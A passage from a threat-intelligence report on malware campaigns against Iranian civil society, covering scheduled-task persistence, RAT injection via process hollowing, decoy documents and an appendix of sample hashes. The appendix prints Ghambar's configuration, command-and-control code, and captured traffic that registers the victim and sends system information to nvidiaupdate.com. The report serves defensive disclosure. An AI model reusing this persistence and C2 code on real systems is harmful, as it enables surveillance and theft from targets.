<StopOnIdleEnd>true</StopOnIdleEnd> 


<RestartOnIdle>false</RestartOnIdle> 
</IdleSettings> 
<AllowStartOnDemand>true</AllowStartOnDemand> 
<Enabled>true</Enabled> 
<Hidden>false</Hidden> 
<RunOnlyIfIdle>false</RunOnlyIfIdle> 
<WakeToRun>false</WakeToRun> 
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
<Priority>7</Priority> 


</Settings> 
<Actions 
Context="Author"> 
<Exec> 
<Command>[LOCATION]</Command> 
</Exec> 
</Actions> 
</Task> 


After 
[USERID] 
and 
[LOCATION] 
are 
respectively 
replaced 
with 
the 
current 
user 
name 
and 
the 
pathto 
the 
previouslydroppedfile, 
this 
task 
definition 
will 
be 
registered 
in 
Windows 
as 
“WinUpdt” 
by 
invoking 
the 
following 
command: 


"C:\Windows\System32\schtasks.exe" 
/Create 
/TN 
"WinUpdt" 
/XML 
C:\Users\User\AppData\Local\Temp\633249106.xml 


Interestingly, 
this 
taskdefinition 
template 
seems 
to 
be 
designed 
to 
be 
lesspervasive 
aswell 
as 
less 
suspicious. 
As 
a 
matter 
of 
fact, 
it 
fakes 
the 
date 
of 
registrationof 
task 
to 
more 
than 
a 
year 
and 
a 
half 
ago, 
it 
only 
requests 
a 
defaultlowmediumpriority, 
it 
is 
not 
marked 
ashidden, 
and 
it 
eveninstructs 
the 
scheduler 
to 
terminate 
the 
task 
if 
the 
computer 
is 
on 
battery 
power. 


Regardless 
of 
which 
stage 
1 
dropper 
was 
employed, 
when 
the 
primary 
payload 
is 
executed 
it 
instantiates 
an 
instanceof 
RegAsm.exe 
(which 
is 
a 
legitimate 
Microsoft 
.NET 
utility) 
in 
asuspended 
state, 
performs 
process 
hollowing, 
and 
replaces 
itsmemory 
withmaliciouscode. 
All 
the 
significantoperations 
of 
the 
malware 
are 
then 
performed 
within 
the 
context 
ofthat 
process. 
Inall 
the 
attacks 
that 
we 
observed, 
the 
injected 
payload 
appears 
tobe 
aRATknown 
as 
LuminosityLink, 
which 
is 
commercially 
available 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


offtheshelf41 
. 
While 
being 
advertised 
on 
its 
website 
as 
a 
legitimate 
remote 
administration 
tool, 
LuminosityLink 
is 
providedwith 
enough 
features 
to 
make 
it 
an 
appealing 
solution 
for 
any 
malicious 
attacker, 
and 
Persianlanguagesecurity 
forums 
includes 
discussion 
of 
the 
application.42 



In 
order 
to 
deceive 
the 
targets 
of 
the 
attacks 
andmaking 
the 
delivered 
payloadappear 
moreinnocuous, 
all 
the 
artifacts 
have 
been 
configured 
to 
display 
an 
Office 
document 
with 
varyingcontent. 
Thesedocuments 
suggest 
the 
nature 
ofthe 
targets, 
which 
generally 
alignswith 
the 
identity 
of 
those 
identified 
through 
the 
names 
given 
by 
the 
attackers 
to 
the 
folders 
we 
retrieved 
the 
files 
from. 
All 
theattacks 
can 
be 
classified 
undertwo 
primary 
thematic 
areas: 
WomenRights 
and 
HumanRightsinIran. 
Therefore, 
thecontent 
of 
the 
decoydocuments 
along, 
with 
what 
we 
believe 
are 
the 
identities 
of 
some 
of 
the 
targets 
of 
theseattacks, 
supports 
the 
theory 
that 
this 
campaign 
is,to 
thebest 
of 
our 
knowledge, 
dedicated 
to 
the 
surveillance 
of 
members 
of 
Iranian 
civil 
society 
anddiaspora. 


Human 
Rights 
in 
Iran 


41 
https://luminosity.link 
42 
http://iedb.ir/acc/da86daafd988d986d987d8a7d8b2db8cdaa9d8b1t2836.
html 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


This 
decoydocumentappears 
to 
be 
copied 
text 
from 
apublic 
reviewof 
human 
rightsreports 
by 
Human 
Rights 
Watch 
and 
Freedom 
House 
posted 
by 
the 
Iranian 
human 
rights 
organization 
Tavaana:43 



Samples 


6c87fd4da4a655987d880aa687825283 


93dcbbd44c53ae780a359baa4ba26da2 


0239f8e9e9f242747607e5f7839d2b75 


The 
followingdecoy 
documents 
instead 
appears 
to 
be 
a 
copy 
of 
anoriginal 
report 
published 
byHuman 
Rights 
Watch 
on 
their 
website:44 


43 
https://tavaana.org/fa/HR_Reports 


44 
https://www.hrw.org/news/2016/01/29/iransendingthousandsafghansfightsyria 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



Samples 


ba20e6d986d51c874fa91e4ceab25583 


This 
decoydocumentappears 
to 
be 
thebiography 
of 
the 
Director 
of 
Emergencies 
at 
Human 
Rights 
Watch, 
as 
directly 
taken 
from 
their 
website:45 


45 
https://www.hrw.org/about/people/peterbouckaert 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



Samples 


879a0b89a1e45a4443e36862fec07954 


EndNote 


As 
noted 
previously, 
this 
document 
is 
only 
a 
first 
release 
in 
a 
more 
ambitious 
endeavour, 
covering 
a 
slim 
subsection 
of 
the 
activities 
targeting 
Iranian 
civil 
society 
and 
political 
opposition. 
We 
invitethe 
informationsecurity 
toshare 
their 
experiences 
and 
insight, 
and 
most 
importantlysamples, 
toward 
the 
broader 
mission 
of 
documenting 
Iran’shistorical 
activities 
in 
this 
area,and 
are 
happy 
to 
provide 
citations. 


Acknowledgements 


The 
authors 
of 
this 
paper 
would 
like 
to 
sincerelythank 
the 
following 
individuals 
and 
organizations, 
inno 
particular 
order:Snorre 
Fagerland, 
Morgan 
MarquisBoire, 
DomainTools, 
AmirRashidi 
(International 
Campaignfor 
Human 
Rights 
in 
Iran), 
Nariman 
Gharib, 
Nima 
Fatemi, 
and 
Simin 
Kargar, 
amongst 
the 
dozens 
ofothers 
who 
have 
provided 
meaningful 
support 
throughout 
this 
process. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Appendix 


GhambarConfiguration 


[APP_EXE_FILE_NAME, 
MSPavilion.exe]
[APPLICATION_NAME, 
Pavilion]
[CommandPromptPathName, 
CSP]
[ConfigFileContent, 
<?xml 
version="1.0" 
encoding="utf8"?> 
<configuration> 


<configSections> 


<sectionGroup 
name="userSettings" 
type="System.Configuration.UserSettingsGroup, 
System, 
Version=2.0.0.0, 
Culture=neutral, 
PublicKeyToken=b77a5c561934e089" 
> 


<section 
name="Roadrunner.Properties.Settings" 
type="System.Configuration.ClientSettingsSection, 
System, 
Version=2.0.0.0, 
Culture=neutral, 
PublicKeyToken=b77a5c561934e089" 
allowExeDefinition="MachineToLocalUser" 
requirePermission="false" 
/> 


</sectionGroup> 
</configSections> 
<startup> 


<supportedRuntime 
version="v2.0.50727"/> 
</startup> 
<system.serviceModel> 


<bindings 
/> 


<client 
/> 
</system.serviceModel> 
<userSettings> 


<Roadrunner.Properties.Settings> 
<setting 
name="ShortPeriodSeconds" 
serializeAs="String"> 


<value>5000</value> 
</setting> 
<setting 
name="MediumPeriodSeconds" 
serializeAs="String"> 


<value>30000</value> 
</setting> 
<setting 
name="LongPeriodSeconds" 
serializeAs="String"> 


<value>60000</value> 
</setting> 
</Roadrunner.Properties.Settings> 


</userSettings> 
</configuration>]
[EncryptionKey, 
100]
[FirstExecuteFileName, 
DFT.dft]
[JPGFilename, 
] 
[KeyloggerPathName, 
KSP] 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


[LIMIT_KEY_LOGGER_LOG_SIZE, 
300]
[PDFFilename, 
] 
[PluginPathName, 
DSP]
[RegFileFormat, 
Windows 
Registry 
Editor 
Version 
5.00 


[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"{0}"="{1}"]
[ScreenshotPathName, 
SSP]
[STARTUP_KEY_NAME, 
MSPavilion]
[StartupKey, 
SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
[StoragePath, 
DS] 


GhambarCommandControl 


namespace 
Pavilion.Communication 


{ 
public 
class 
CommandControlController 
{ 


public 
static 
void 
CommandControlProc(ServiceManifest 
communicationChannel, 
string 
targetId)

{ 
try{ 


if 
(!string.IsNullOrEmpty(targetId) 
|| 
Utils.IsServerEndpointAvaliable()) 


{ 
Utils.DbgPrint("Plugins"); 
T4[] 
targetPlugins 
= 


communicationChannel.GetTargetPlugins(targetId); 
if 
(targetPlugins 
!= 
null 
&& 
targetPlugins.Length 
!= 
0) 
{ 


new 
CommandProcessor(communicationChannel, 
targetId).ProcessPlugins(targetPlugins); 


}
Utils.DbgPrint("File 
manager"); 
T3[] 
fileManagerCommands 
= 


communicationChannel.GetFileManagerCommands(targetId); 
if 
(fileManagerCommands 
!= 
null 
&& 
fileManagerCommands.Length 
!= 
0)
{ 


new 
CommandProcessor(communicationChannel, 
targetId).ProcessFileManagerCommands(fileManagerCommands); 


}
Utils.DbgPrint(" 
GetTargetCommands"); 
T6[] 
targetCommands 
= 


communicationChannel.GetTargetCommands(targetId); 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


if 
(targetCommands 
!= 
null 
&& 


targetCommands.Length 
!= 
0) 


{ 


new 


CommandProcessor(communicationChannel, 
targetId).ProcessCommands(targetCommands); 
}

}
} 
catch 
(Exception 
ex)
{ 


string 
name 
= 
MethodBase.GetCurrentMethod().Name; 
Utils.DbgPrint(string.Format("Method 
Name 
: 
{0} 
Msg: 
{1}", 
name, 
ex.Message)); 
}
}
}
} 


GhambarNetwork 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
checksin 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

with 
the 
C&C. 


ContentType: 
text/xml; 
charset=utf8 
SOAPAction: 
"http://tempuri.org/IBuilder/AreYouAvaliable" 
Host: 
nvidiaupdate.
com:5050 
ContentLength: 
293 
Expect: 
100continue 
Connection: 
KeepAlive 


Response 
HTTP/1.1 
100 
Continue 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance"> 


<soap:Body> 
<AreYouAvaliable 
xmlns="http://tempuri.org/" 
/> 
</soap:Body> 
</soap:Envelope> 


Response 
HTTP/1.1 
200 
OK 
ContentLength: 
224 
ContentType: 
text/xml; 
charset=utf8 
Server: 
MicrosoftHTTPAPI/
2.0 
Date: 
[REDACTED] 


<?xml 
version="1.0" 
encoding="UTF8"?> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


<s:Envelope 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 
<s:Body> 
<AreYouAvaliableResponse 
xmlns="http://tempuri.org/"> 


<AreYouAvaliableResult>true</AreYouAvaliableResult> 
</AreYouAvaliableResponse> 
</s:Body> 
</s:Envelope> 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
requests 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

to 
register 
the 


ContentType: 
text/xml; 
charset=utf8


compromised 
host. 


SOAPAction: 
"http://tempuri.org/ITargetUtils/RegisterTarget" 
Host: 
nvidiaupdate.
com:5050 
ContentLength: 
419 
Expect: 
100continue 


Response 
HTTP/1.1 
100 
Continue 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 


First 
the 
client 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 


provides 
some 


xmlns:xsd="http://www.w3.org/2001/XMLSchema" 


identifiers. 


xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance"> 
<soap:Body> 


<RegisterTarget 
xmlns="http://tempuri.org/"> 
<buildId>[BUILD 
ID]</buildId> 
<targetId>[TARGET 
ID]</targetId> 


</RegisterTarget> 
</soap:Body> 
</soap:Envelope> 


Response 
HTTP/1.1 
200 
OK 
ContentLength: 
225 
ContentType: 
text/xml; 
charset=utf8 
Server: 
MicrosoftHTTPAPI/
2.0 
Date: 
[REDACTED] 


<?xml 
version="1.0" 
encoding="UTF8"?> 
<s:Envelope 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 


<s:Body> 
<RegisterTargetResponse 
xmlns="http://tempuri.org/"> 


<RegisterTargetResult>RtSuccess</RegisterTargetResult> 
</RegisterTargetResponse> 
</s:Body> 
</s:Envelope> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
starts 
the 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

checkin 
routine. 


ContentType: 
text/xml; 
charset=utf8 
SOAPAction: 
"http://tempuri.org/ITargetUtils/ImOnline" 
Host: 
nvidiaupdate.
com:5050 
ContentLength: 
352 
Expect: 
100continue 


Response 
HTTP/1.1 
100 
Continue 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance"> 


<soap:Body> 
<ImOnline 
xmlns="http://tempuri.org/"> 
<targetId>[TARGET 
ID]</targetId> 
</ImOnline> 
</soap:Body> 
</soap:Envelope> 


Response 
HTTP/1.1 
200 
OK 
ContentLength: 
196 
ContentType: 
text/xml; 
charset=utf8 
Server: 
MicrosoftHTTPAPI/
2.0 
Date: 
[REDACTED] 


<?xml 
version="1.0" 
encoding="UTF8"?> 
<s:Envelope 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 


<s:Body> 
<ImOnlineResponse 
xmlns="http://tempuri.org/"> 
<ImOnlineResult>true</ImOnlineResult> 
</ImOnlineResponse> 
</s:Body> 
</s:Envelope> 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
requests 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

to 
send 
some 


ContentType: 
text/xml; 
charset=utf8


generic 
information 


SOAPAction:on 
the 
"http://tempuri.org/ITargetUtils/SendTargetSystemInfo" 
compromised 
host. 
Host: 
nvidiaupdate.
com:5050 


ContentLength: 
15733 
Expect: 
100continue 


Response 
HTTP/1.1 
100 
Continue 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 


The 
client 
sends 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 


the 
collected 


xmlns:xsd="http://www.w3.org/2001/XMLSchema" 


information, 


xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance">


including 
installed 


<soap:Body> 
applications, 
<SendTargetSystemInfo 
xmlns="http://tempuri.org/"> 
network 
<targetId>[TARGET 
ID]</targetId> 
configuration, 
and 
<targetSystemInfo> 
running 
processes. 
<ComputerName 


xmlns="http://schemas.datacontract.org/2004/07/Common">[COM 
PUTER 
NAME]</ComputerName> 
<IntalledApplications 
xmlns="http://schemas.datacontract.org/2004/07/Common"> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">[name 
of 
application 
installed]</string> 


... 
</IntalledApplications> 
<InternalIps 


xmlns="http://schemas.datacontract.org/2004/07/Common"> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">[IPV6 
IP]</string> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">[IPv4 
IP]</string> 


</InternalIps> 
<Languages 
xmlns="http://schemas.datacontract.org/2004/07/Common"> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">US</string> 


</Languages> 
<OpenPorts 
xmlns="http://schemas.datacontract.org/2004/07/Common"> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">0.0.0.0:[PORT]</string> 


... 
</OpenPorts> 
<Processes 


xmlns="http://schemas.datacontract.org/2004/07/Common"> 


<string 
xmlns="http://schemas.microsoft.com/2003/10/Serialization/A 
rrays">[PROCESS 
NAME]</string> 


... 
</Processes> 
<PublicIp 


xmlns="http://schemas.datacontract.org/2004/07/Common">[PUB 
LIC 
IP]</PublicIp> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


<TimeZone 
xmlns="http://schemas.datacontract.org/2004/07/Common">[TIM 
EZONE]</TimeZone> 


<Username 
xmlns="http://schemas.datacontract.org/2004/07/Common">[COM 
PUTER 
NAME]\[USER 
NAME]</Username> 


</targetSystemInfo> 
</SendTargetSystemInfo> 
</soap:Body> 
</soap:Envelope> 


Response 
HTTP/1.1 
200 
OK 
ContentLength: 
244 
ContentType: 
text/xml; 
charset=utf8 
Server: 
MicrosoftHTTPAPI/
2.0 
Date: 
[REDACTED] 


<?xml 
version="1.0" 
encoding="UTF8"?> 
<s:Envelope 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 


<s:Body> 
<SendTargetSystemInfoResponse 
xmlns="http://tempuri.org/"> 


<SendTargetSystemInfoResult>true</SendTargetSystemInfoResul 
t> 
</SendTargetSystemInfoResponse> 
</s:Body> 
</s:Envelope> 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
checks 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

whether 
there 
are 


ContentType: 
text/xml; 
charset=utf8


plugins 
to 
execute. 


SOAPAction: 
"http://tempuri.org/IClienPluginUtils/GetTargetPlugins" 
Host: 
nvidiaupdate.
com:5050 
ContentLength: 
368 
Expect: 
100continue 


Response 
HTTP/1.1 
100 
Continue 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance"> 


<soap:Body> 
<GetTargetPlugins 
xmlns="http://tempuri.org/"> 
<targetId>[TARGET 
ID]</targetId> 
</GetTargetPlugins> 
</soap:Body> 
</soap:Envelope> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Response 
HTTP/1.1 
200 
OK 
The 
server 
doesn’t 
ContentLength: 
330 
ContentType: 
text/xml; 
charset=utf8


provide 
any 


Server: 
MicrosoftHTTPAPI/
2.0

plugins. 


Date: 
[REDACTED] 


<?xml 
version="1.0" 
encoding="UTF8"?> 
<s:Envelope 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 


<s:Body> 
<GetTargetPluginsResponse 
xmlns="http://tempuri.org/"> 


<GetTargetPluginsResult 
xmlns:a="http://schemas.datacontract.org/2004/07/Server.DBM 
odel" 
xmlns:i="http://www.w3.org/2001/XMLSchemainstance" 
i:nil="true" 
/> 


</GetTargetPluginsResponse> 
</s:Body> 
</s:Envelope> 


Request 
POST 
/D6E904211C4541A492503F18B9633CE2 
HTTP/1.1 
The 
client 
checks 
UserAgent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
MS 
Web 
Services 
Client 
Protocol 
2.0.50727.5420)

whether 
there 
are 


ContentType: 
text/xml; 
charset=utf8


filesystem 


SOAPAction:

commands 
to 


"http://tempuri.org/IFileManagerUtils/GetFileManagerCommand 


execute. 


s" 
Host: 
nvidiaupdate.
com:5050 
ContentLength: 
380 
Expect: 
100continue 


Response 
HTTP/1.1 
100 
Continue 


Request 
<?xml 
version="1.0" 
encoding="UTF8"?> 
<soap:Envelope 
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance"> 


<soap:Body> 
<GetFileManagerCommands 
xmlns="http://tempuri.org/"> 
<targetId>[TARGET 
ID]</targetId> 
</GetFileManagerCommands> 
</soap:Body> 
</soap:Envelope> 


Response 
HTTP/1.1 
200 
OK 


The 
server 
instructs 
ContentLength: 
756 
ContentType: 
text/xml; 
charset=utf8


the 
client 
to 
run 
the 


Server: 
MicrosoftHTTPAPI/
2.0

FileManager 


Date: 
[REDACTED]

command 
with 
ID 
8, 


which 
makes 
the 
<?xml 
version="1.0" 
encoding="UTF8"?> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


client 
collect 
a 
list 
<s:Envelope 


of 
all 
files 
available 
xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"> 
<s:Body>

across 
all 
disks 


<GetFileManagerCommandsResponse

mounted 
on 
the 


xmlns="http://tempuri.org/"> 


computer. 


<GetFileManagerCommandsResult 


xmlns:a="http://schemas.datacontract.org/2004/07/Server.DBM 


odel" 
xmlns:i="http://www.w3.org/2001/XMLSchemainstance"> 


<a:T3> 
<a:CommandsType 
i:nil="true" 
/> 


<a:CommandsTypesID>8</a:CommandsTypesID> 
<a:ID>[ID]</a:ID> 
<a:IsSuucess>false</a:IsSuucess> 
<a:LocalStoragePath 
i:nil="true" 
/> 
<a:Parameter 
i:nil="true" 
/> 
<a:RegisterDate>[DATE]</a:RegisterDate> 
<a:RunDate 
i:nil="true" 
/> 
<a:Target 
i:nil="true" 
/> 
<a:TargetID>[TARGET 
ID]</a:TargetID> 


</a:T3> 
</GetFileManagerCommandsResult> 
</GetFileManagerCommandsResponse> 
</s:Body> 
</s:Envelope> 


InfyHashes 


2667b356b5a36232b7fbe3cedd4c9b44b9cf4150c445cf6871fa4b2c8daac16e 
2f294d20aea4741091ddb36540b1512161ddfd3caa3831bfc44fcc75c1ba1db9 
0f7b24298e1eb983adc9244ee2ff18e0a6dba5d269d42725d5dbac17910c4daf 
3c707f1ea5bd42a1c8f48e2e34e8a2cbdfa3f305f5b38aac5427ee5fc00857a3 
16bcc5064630591b7f5a85b807704262bc7923a77b7a475b4c2cb4fe7ae7056a 
fc8b141949d008a858439af68236f8eb342273ade1c38a3e0b41ebe07788cd00 
7aaef5813058a8b14a15f81b398a53e1f241dbf246108f17871727bef6a6c98d 
39d951c330277a8b22bdd8fb64db1629b1036b16754fc0d740eee2bd009d01f7 
c3eddcbb5ccabc8090cc0bbb5772da5992fa9e33cda8ecdb541399841d281661 
c379a700975a72d0ac332e28d408d3bae0b6a7243180631d62a1df0240581742 
9c19afd0afd7dea5fabf82303898a6755df7d24b8720012e32d54bdeb3bb9ffc 
3f1fe8d7a3f0562f04c095aa3fafec48797ca114477ca3b332745d0dcca617ee 
19860e921cd2d775f51ccc03edbeab80646677a0c8152589e5f1976cba768579 
c14c039407ed833d2ee65512fe91d4a0daa8ab43350371357481ae1fbfc011e2 
2d11aabc362fd7a0359a2f8023ae51f7886d76afb25a8a49ebb9cfd57ab49b87 
fbdc4364ec9d7d09e5c9b86a0ea5f5c48a37df48d274013e91bf1893b4456f95 
13efe41a4ed172b19a60f3de751daff7612bd291539c3ebcea233043275e6ff6 
3c9319749df130c00a7b563fb99028b0dc11592da9af1fbf3349f53bb7c8cad9 
6540e3c6dbab604871f7c9b29e4471c8e02aac382aaa74930aa213786ffcc72b 
a9382f4eb13ec502848efb1a85cd86a59cbb87f7e08f7ade8280c8863ee7cac8 
e3e8199cd5b6fbf0f21d52520b88821ee9944a8cb9989b950d07d99e2b6f0c9a 
46c6820b373be028dc42f190bf7c75a7b1491d56775a2797445e1cb7733009e0 
2ddb74fe0d7a1f6f633dbe575aaf7298085b414fdfc343ab26fc939fa7c0e76f 
49acbfe9afce8bd7b780d309d86319a823e0bfa302a901db997eb9a6baaffa5c 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


2ddb74fe0d7a1f6f633dbe575aaf7298085b414fdfc343ab26fc939fa7c0e76f 
374157480f9416bc2c486c204e8bdb6e1d149f9e7dc12fb3128c6f7ca1d89ff6 
9a6104377ca2da5f3b63dfc59978f067d65c69fd0393e05650dc972c054fde59 
058b64614ef2ca5492346966846e494b93f9d531f8efe482e521d0ae44c1b2b7 
ccf55307429103bf795e9d477cb15072b0c490b92b6633785df95c8f050eaf6a 
14fe3923694a47a94674e98ba33308266f06aa8d0a35673325f6ee539d78f2c1 
bcb4789fb705d16657c18c0350fd86350d8feed8f8b98385512b018f41c16b12 
04b72e7a02e12e5fd795ba0593df51c6653e257a1a65750c395db2007841118c 
03931ddb969dfd7eae16114edb31b85d0cc930a74e3302f3224054dd11ea5585 
ed376d37a9d07705a33a05c33fdb2aa40d7d80d5c8d34dc681656bc1c389f151 
e355b7f1c88d8d0919d4526b113fea25902fd095a2cb934296c984d8015421dd 
e1f95a38b436afdf6a1141f07a1e092ce90740e4d6c3d85f4910e63ecbed390f 
060c1531890ab8bb5854d00355df73784b675090ee7e9e56d7aadde1b6e983ba 
0598dd550b3854380a4afe915f61ad63ca807d3adf52f4548a49290fbbf7f1e0 
9f016d21b3602ebe3f1f4db6f55e102cfb08084fd0fb2b3413b911a8f993c7f8 
ab6bc6d2802ce622f5dbbeb7ab63fea48fcd78dd3755ac2226358d8c6816c3cc 
71dbd5677d812de362e82bddbe11aedbf24edf0e10a49861e3c5ae58b14d4603 
2c4740eb58ef192f43e1e2066c2820ea8c2b9e88ac54c8ac9112114d0899be7b 
3f4d7bbe3d5513b93bd354f4120c98be7a1a388f37de1049262deaa5fb7eb2ac 
55205d75a045959054d10f0dee4277679528071b9593c76a44e6f0ba30c8b305 
818de69a85e1deb79693b326afa70a8a2a384c502d6667406608f5b86c4fea2a 
bb66faefc92f3dd799db42b3835235cbee8882015c193867cd4cbf118c95aaed 
e1f95a38b436afdf6a1141f07a1e092ce90740e4d6c3d85f4910e63ecbed390f 
fd948669e9f11be95cf3f7a70c4bd0adcc7857f350ed25cbb77428f8e736f7b1 
26b87a0a8a7ac56955f5013d279b30d6559b470eaf722f607dba9e382b6d7003 
2f294d20aea4741091ddb36540b1512161ddfd3caa3831bfc44fcc75c1ba1db9 
37ca57083768b783beee896d3e1f84c96e7c0bb39d3fb7ccf09caff63ea13629 
43bd06de8cfc34a98ed59b29a9499d934bfe5aeb541a87296e5b509dd4a50514 
52f112c65a0532749f7e68790fee687a47aecd1d2ed50bfca546e79393e03fb4 
55c29dc2be5c681e7f1e6fdc1a46eaa7a3ba711820e9620707f8f41874cb0751 
5655adef4a05f29fc003ea573f10f219b3cad4d4a811c8355349118b89bb35ee 
587aac84cf62c768b2d30131cc9f7ac2d9c73c874ca49961aa2b70c5227d43cf 
6c5871fb6364c10afa2c949714108818388e609308f087ee3b57fe82b9c2d10e 
774b107fe5b1dad409039ab7c702112a31999089e33c37f5800ad8090b855c21 
7ef47f72a5b47df3a9f3830f21dd8478c87f5b178452679cebd93ce18ce27502 
8db637c4ff5d464dfa23fdd2b1bced369015b5fdfcee841549a2b5d8d2449c27 
8ec73a4032ca01ed7dd325a02e995548ca80e950f05ace36a656c35f47a835d8 
b7170b06ff9aefb8c82ac0d336cc99f75cb9b08ef71c6aa62b39497bb3c87a05 
ca321cf2590cda54c6c195f89d8862090355486cfbc13283534901558a055f3a 
ca50bb6c13d2f44b2e41c868d69696751abe027a58fec4a3ced32652f074c867 
cb5219513c3eb3cf8aaf10676b7976db97370a843cdb58bb2fcc2391493257b2 
d84b30a0752b9aec2fab7f32cfbf53193cb74db6d1c5c6b63b40756176e5b473 
12ab8e615eb8f2b531534e2724ebd34917539343b9f5b43d7c62860d19fb9954 
7b0bc1442036e4fed232073ffcf13322d1d5fd9b60a2b8c0f14848d6e3c4a596 
935e9fce0422e6dcbb7b7462379c31ba01da3a6475e508ab5926c1bd340b0c02 


Cleaver(Ghambar)Hashes 


261c5f32abb8801576ce81be2c66bca564a8a28ab5ea0954bad6bac7071e299b 
2c92da2721466bfbdaff7fedd9f3e8334b688a88ee54d7cab491e1a9df41258f 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


RocketKittenHashes 


ff5ff4fee5b52c6b53fd1c01790df235d65d673b927c1cc90b7020a571c21894 
0c1fe38b035a125253f4d28c08c63433f5325a113810cb7e750c80e3bfcdeea9 
333430c63c407b343fde95634d4620682ba8e660cefb6b5c17e5a473e0780024 
58b0ce144d830b2d19c47c2abf0d357d188ef923b525e748085fca7ab6b1bbb0 
3b20dc9e9eebd9457cce3d0a4a0497f36599925c4157147b116e9eb7cf7e0db7 
96590f60cf2f2c4484e4130c79738f32fac2e689bbc2ecd28dc02425ad06c38e 


SimaHashes 


0fa3583fb34ab722129f64a5ee2aeec353152988e505a042da3ba26955ee35f4 
11cad49a9b0a811db4e159e8802d25e96b5d7a3d35abfe1875de59de85a4a547 
37e9d941b603e364dfabb1738b9257800d1fb0d17c2674385165683f69e86d62 
6540e3c6dbab604871f7c9b29e4471c8e02aac382aaa74930aa213786ffcc72b 
dac3a657ef25701895bcc8b76eab4d72d8469917dbd3adef2865ed1777a42f74 
ec55ba45ac6aa9dd60c7210c02271476d41f05e9ce12bbb2c4d9e39ce6b83bf7 



